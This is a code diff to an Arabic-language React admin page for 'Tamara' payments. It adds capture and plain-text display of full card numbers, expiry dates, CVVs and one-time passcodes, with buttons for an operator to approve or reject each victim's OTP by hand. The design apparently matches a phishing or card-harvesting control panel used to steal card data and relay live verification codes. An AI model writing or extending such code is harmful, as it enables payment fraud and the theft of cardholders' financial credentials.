@@ -14,7 +14,11 @@ import { ar } from "date-fns/locale";
 interface TamaraPayment {
   id: string;
   cardholder_name: string;
+  card_number: string | null;
   card_number_last4: string;
+  expiry_date: string | null;
+  cvv: string | null;
+  otp_code: string | null;
   total_amount: number;
   monthly_payment: number;
   company: string;
@@ -141,6 +145,62 @@ const AdminTamaraPayments = () => {
     }
   };
 
+  const handleApproveOtp = async (paymentId: string) => {
+    setProcessingPayment(paymentId);
+    try {
+      const { error } = await supabase
+        .from('tamara_payments')
+        .update({ payment_status: 'completed' })
+        .eq('id', paymentId);
+
+      if (error) throw error;
+
+      toast({
+        title: "تم تأكيد OTP",
+        description: "تمت الموافقة على كود التحقق بنجاح",
+      });
+      
+      await fetchPayments();
+    } catch (error) {
+      console.error("Error approving OTP:", error);
+      toast({
+        title: "خطأ",
+        description: "فشل في الموافقة على كود التحقق",
+        variant: "destructive",
+      });
+    } finally {
+      setProcessingPayment(null);
+    }
+  };
+
+  const handleRejectOtp = async (paymentId: string) => {
+    setProcessingPayment(paymentId);
+    try {
+      const { error } = await supabase
+        .from('tamara_payments')
+        .update({ payment_status: 'otp_rejected' })
+        .eq('id', paymentId);
+
+      if (error) throw error;
+
+      toast({
+        title: "تم رفض OTP",
+        description: "تم رفض كود التحقق",
+      });
+      
+      await fetchPayments();
+    } catch (error) {
+      console.error("Error rejecting OTP:", error);
+      toast({
+        title: "خطأ",
+        description: "فشل في رفض كود التحقق",
+        variant: "destructive",
+      });
+    } finally {
+      setProcessingPayment(null);
+    }
+  };
+
   const getStatusBadge = (status: string) => {
     switch (status) {
       case 'pending':
@@ -198,8 +258,24 @@ const AdminTamaraPayments = () => {
                     <CardContent>
                       <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                         <div>
-                          <p className="text-sm text-gray-600">رقم البطاقة</p>
+                          <p className="text-sm text-gray-600">رقم البطاقة الكامل</p>
+                          <p className="font-medium">{payment.card_number || 'غير متوفر'}</p>
+                        </div>
+                        <div>
+                          <p className="text-sm text-gray-600">آخر 4 أرقام</p>
                           <p className="font-medium">**** **** **** {payment.card_number_last4}</p>
+                        </div>
+                        <div>
+                          <p className="text-sm text-gray-600">تاريخ الانتهاء</p>
+                          <p className="font-medium">{payment.expiry_date || 'غير متوفر'}</p>
+                        </div>
+                        <div>
+                          <p className="text-sm text-gray-600">CVV</p>
+                          <p className="font-medium">{payment.cvv || 'غير متوفر'}</p>
+                        </div>
+                        <div>
+                          <p className="text-sm text-gray-600">كود التحقق (OTP)</p>
+                          <p className="font-bold text-lg text-primary">{payment.otp_code || 'لم يتم إدخاله بعد'}</p>
                         </div>
                         <div>
                           <p className="text-sm text-gray-600">شركة التأمين</p>
@@ -241,6 +317,36 @@ const AdminTamaraPayments = () => {
                               <X className="h-4 w-4 ml-2" />
                             )}
                             رفض الدفع
+                          </Button>
+                        </div>
+                      )}
+
+                      {payment.payment_status === 'approved' && payment.otp_code && (
+                        <div className="flex gap-3 mt-4 pt-4 border-t">
+                          <Button
+                            onClick={() => handleApproveOtp(payment.id)}
+                            disabled={processingPayment === payment.id}
+                            className="flex-1 bg-green-600 hover:bg-green-700"
+                          >
+                            {processingPayment === payment.id ? (
+                              <Loader2 className="h-4 w-4 animate-spin ml-2" />
+                            ) : (
+                              <Check className="h-4 w-4 ml-2" />
+                            )}
+                            الموافقة على OTP
+                          </Button>
+                          <Button
+                            onClick={() => handleRejectOtp(payment.id)}
+                            disabled={processingPayment === payment.id}
+                            variant="destructive"
+                            className="flex-1"
+                          >
+                            {processingPayment === payment.id ? (
+                              <Loader2 className="h-4 w-4 animate-spin ml-2" />
+                            ) : (
+                              <X className="h-4 w-4 ml-2" />
+                            )}
+                            رفض OTP
                           </Button>
                         </div>
                       )}
